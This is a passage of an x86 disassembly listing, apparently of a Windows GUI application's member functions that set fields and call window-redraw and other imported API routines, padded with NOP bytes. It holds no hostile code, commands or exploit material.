  404856:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  40485a:	c7 84 24 a8 00 00 00 	movl   $0xffffffff,0xa8(%esp)
  404861:	ff ff ff ff 
  404865:	e8 24 fa 00 00       	call   0x41428e
  40486a:	8b 8c 24 a0 00 00 00 	mov    0xa0(%esp),%ecx
  404871:	5f                   	pop    %edi
  404872:	5e                   	pop    %esi
  404873:	5d                   	pop    %ebp
  404874:	5b                   	pop    %ebx
  404875:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40487c:	81 c4 9c 00 00 00    	add    $0x9c,%esp
  404882:	c3                   	ret
  404883:	90                   	nop
  404884:	90                   	nop
  404885:	90                   	nop
  404886:	90                   	nop
  404887:	90                   	nop
  404888:	90                   	nop
  404889:	90                   	nop
  40488a:	90                   	nop
  40488b:	90                   	nop
  40488c:	90                   	nop
  40488d:	90                   	nop
  40488e:	90                   	nop
  40488f:	90                   	nop
  404890:	56                   	push   %esi
  404891:	8b f1                	mov    %ecx,%esi
  404893:	33 c0                	xor    %eax,%eax
  404895:	6a 01                	push   $0x1
  404897:	8b 96 94 00 00 00    	mov    0x94(%esi),%edx
  40489d:	8b 4e 20             	mov    0x20(%esi),%ecx
  4048a0:	85 d2                	test   %edx,%edx
  4048a2:	0f 94 c0             	sete   %al
  4048a5:	6a 00                	push   $0x0
  4048a7:	51                   	push   %ecx
  4048a8:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  4048ae:	ff 15 84 86 41 00    	call   *0x418684
  4048b4:	8b 56 20             	mov    0x20(%esi),%edx
  4048b7:	52                   	push   %edx
  4048b8:	ff 15 e8 85 41 00    	call   *0x4185e8
  4048be:	8b ce                	mov    %esi,%ecx
  4048c0:	e8 9b f7 00 00       	call   0x414060
  4048c5:	5e                   	pop    %esi
  4048c6:	c2 04 00             	ret    $0x4
  4048c9:	90                   	nop
  4048ca:	90                   	nop
  4048cb:	90                   	nop
  4048cc:	90                   	nop
  4048cd:	90                   	nop
  4048ce:	90                   	nop
  4048cf:	90                   	nop
  4048d0:	8b 81 a8 00 00 00    	mov    0xa8(%ecx),%eax
  4048d6:	85 c0                	test   %eax,%eax
  4048d8:	74 0f                	je     0x4048e9
  4048da:	50                   	push   %eax
  4048db:	ff 15 3c 86 41 00    	call   *0x41863c
  4048e1:	b8 01 00 00 00       	mov    $0x1,%eax
  4048e6:	c2 0c 00             	ret    $0xc
  4048e9:	e8 72 f7 00 00       	call   0x414060
  4048ee:	c2 0c 00             	ret    $0xc
  4048f1:	90                   	nop
  4048f2:	90                   	nop
  4048f3:	90                   	nop
  4048f4:	90                   	nop
  4048f5:	90                   	nop
  4048f6:	90                   	nop
  4048f7:	90                   	nop
  4048f8:	90                   	nop
  4048f9:	90                   	nop
  4048fa:	90                   	nop
  4048fb:	90                   	nop
  4048fc:	90                   	nop
  4048fd:	90                   	nop
  4048fe:	90                   	nop
  4048ff:	90                   	nop
  404900:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404906:	6a ff                	push   $0xffffffff
  404908:	68 38 4f 41 00       	push   $0x414f38
  40490d:	50                   	push   %eax
  40490e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404915:	83 ec 10             	sub    $0x10,%esp
  404918:	56                   	push   %esi
  404919:	8b f1                	mov    %ecx,%esi
  40491b:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  404921:	85 c0                	test   %eax,%eax
  404923:	74 48                	je     0x40496d
  404925:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404929:	e8 c8 f7 00 00       	call   0x4140f6
  40492e:	8d 44 24 04          	lea    0x4(%esp),%eax
  404932:	8b ce                	mov    %esi,%ecx
  404934:	50                   	push   %eax
  404935:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  40493c:	00 
  40493d:	e8 ae f7 00 00       	call   0x4140f0
  404942:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404946:	6a 01                	push   $0x1
  404948:	6a 00                	push   $0x0
  40494a:	6a 00                	push   $0x0
  40494c:	51                   	push   %ecx
  40494d:	68 7c e4 41 00       	push   $0x41e47c
  404952:	6a 00                	push   $0x0
  404954:	ff 15 cc 85 41 00    	call   *0x4185cc
  40495a:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40495e:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  404965:	ff 
  404966:	e8 6d f7 00 00       	call   0x4140d8
  40496b:	eb 40                	jmp    0x4049ad
  40496d:	8b 56 20             	mov    0x20(%esi),%edx
  404970:	8b ce                	mov    %esi,%ecx
  404972:	89 54 24 08          	mov    %edx,0x8(%esp)
  404976:	e8 37 f9 00 00       	call   0x4142b2
  40497b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40497f:	8b 46 20             	mov    0x20(%esi),%eax
  404982:	50                   	push   %eax
  404983:	c7 44 24 14 00 82 00 	movl   $0x8200,0x14(%esp)
  40498a:	00 
  40498b:	ff 15 6c 86 41 00    	call   *0x41866c
  404991:	50                   	push   %eax
  404992:	e8 c3 f6 00 00       	call   0x41405a
  404997:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40499b:	8b 40 20             	mov    0x20(%eax),%eax
  40499e:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4049a2:	51                   	push   %ecx
  4049a3:	52                   	push   %edx
  4049a4:	6a 4e                	push   $0x4e
  4049a6:	50                   	push   %eax
  4049a7:	ff 15 5c 86 41 00    	call   *0x41865c
  4049ad:	8b ce                	mov    %esi,%ecx
  4049af:	e8 ac f6 00 00       	call   0x414060
  4049b4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4049b8:	5e                   	pop    %esi
  4049b9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4049c0:	83 c4 1c             	add    $0x1c,%esp
  4049c3:	c2 0c 00             	ret    $0xc
  4049c6:	90                   	nop
  4049c7:	90                   	nop
  4049c8:	90                   	nop
  4049c9:	90                   	nop
  4049ca:	90                   	nop
  4049cb:	90                   	nop
  4049cc:	90                   	nop
  4049cd:	90                   	nop
  4049ce:	90                   	nop
  4049cf:	90                   	nop
  4049d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4049d4:	56                   	push   %esi
  4049d5:	8b f1                	mov    %ecx,%esi
  4049d7:	8b 08                	mov    (%eax),%ecx
  4049d9:	51                   	push   %ecx
  4049da:	8b ce                	mov    %esi,%ecx
  4049dc:	e8 71 f8 00 00       	call   0x414252
  4049e1:	8b 56 20             	mov    0x20(%esi),%edx
  4049e4:	6a 00                	push   $0x0
  4049e6:	6a 00                	push   $0x0
  4049e8:	52                   	push   %edx
  4049e9:	ff 15 84 86 41 00    	call   *0x418684
  4049ef:	8b c6                	mov    %esi,%eax
  4049f1:	5e                   	pop    %esi
  4049f2:	c2 04 00             	ret    $0x4
  4049f5:	90                   	nop
  4049f6:	90                   	nop
  4049f7:	90                   	nop
  4049f8:	90                   	nop
  4049f9:	90                   	nop
  4049fa:	90                   	nop
  4049fb:	90                   	nop
  4049fc:	90                   	nop
  4049fd:	90                   	nop
  4049fe:	90                   	nop
  4049ff:	90                   	nop
  404a00:	8b 44 24 04          	mov    0x4(%esp),%eax
  404a04:	56                   	push   %esi
  404a05:	8b f1                	mov    %ecx,%esi
  404a07:	68 05 01 00 00       	push   $0x105
  404a0c:	6a 00                	push   $0x0
  404a0e:	6a 00                	push   $0x0
  404a10:	8b 4e 20             	mov    0x20(%esi),%ecx
  404a13:	89 46 40             	mov    %eax,0x40(%esi)
  404a16:	51                   	push   %ecx
  404a17:	ff 15 94 86 41 00    	call   *0x418694
  404a1d:	8b c6                	mov    %esi,%eax
  404a1f:	5e                   	pop    %esi
  404a20:	c2 04 00             	ret    $0x4
  404a23:	90                   	nop
  404a24:	90                   	nop
  404a25:	90                   	nop
  404a26:	90                   	nop
  404a27:	90                   	nop
  404a28:	90                   	nop
  404a29:	90                   	nop
  404a2a:	90                   	nop
  404a2b:	90                   	nop
  404a2c:	90                   	nop
  404a2d:	90                   	nop
  404a2e:	90                   	nop
  404a2f:	90                   	nop
  404a30:	8b 44 24 04          	mov    0x4(%esp),%eax
  404a34:	56                   	push   %esi
  404a35:	f7 d8                	neg    %eax
  404a37:	1b c0                	sbb    %eax,%eax
  404a39:	8b f1                	mov    %ecx,%esi
  404a3b:	25 2c 01 00 00       	and    $0x12c,%eax
  404a40:	05 90 01 00 00       	add    $0x190,%eax
  404a45:	89 46 5c             	mov    %eax,0x5c(%esi)
  404a48:	e8 e3 f9 ff ff       	call   0x404430
  404a4d:	8b 4e 20             	mov    0x20(%esi),%ecx
  404a50:	68 05 01 00 00       	push   $0x105
  404a55:	6a 00                	push   $0x0
  404a57:	6a 00                	push   $0x0
  404a59:	51                   	push   %ecx
  404a5a:	ff 15 94 86 41 00    	call   *0x418694
  404a60:	8b c6                	mov    %esi,%eax
  404a62:	5e                   	pop    %esi
  404a63:	c2 04 00             	ret    $0x4
  404a66:	90                   	nop
  404a67:	90                   	nop
  404a68:	90                   	nop
  404a69:	90                   	nop
  404a6a:	90                   	nop
  404a6b:	90                   	nop
  404a6c:	90                   	nop
  404a6d:	90                   	nop
  404a6e:	90                   	nop
  404a6f:	90                   	nop
  404a70:	8a 44 24 04          	mov    0x4(%esp),%al
  404a74:	56                   	push   %esi
  404a75:	8b f1                	mov    %ecx,%esi
  404a77:	88 46 61             	mov    %al,0x61(%esi)
  404a7a:	e8 b1 f9 ff ff       	call   0x404430
  404a7f:	8b 4e 20             	mov    0x20(%esi),%ecx
  404a82:	68 05 01 00 00       	push   $0x105
  404a87:	6a 00                	push   $0x0
  404a89:	6a 00                	push   $0x0
  404a8b:	51                   	push   %ecx
  404a8c:	ff 15 94 86 41 00    	call   *0x418694
  404a92:	8b c6                	mov    %esi,%eax
  404a94:	5e                   	pop    %esi
  404a95:	c2 04 00             	ret    $0x4
  404a98:	90                   	nop
  404a99:	90                   	nop
  404a9a:	90                   	nop
  404a9b:	90                   	nop
  404a9c:	90                   	nop
  404a9d:	90                   	nop
  404a9e:	90                   	nop
  404a9f:	90                   	nop
  404aa0:	8a 44 24 04          	mov    0x4(%esp),%al
  404aa4:	56                   	push   %esi
  404aa5:	8b f1                	mov    %ecx,%esi
  404aa7:	88 46 60             	mov    %al,0x60(%esi)
  404aaa:	e8 81 f9 ff ff       	call   0x404430
  404aaf:	8b 4e 20             	mov    0x20(%esi),%ecx
  404ab2:	68 05 01 00 00       	push   $0x105
  404ab7:	6a 00                	push   $0x0
  404ab9:	6a 00                	push   $0x0
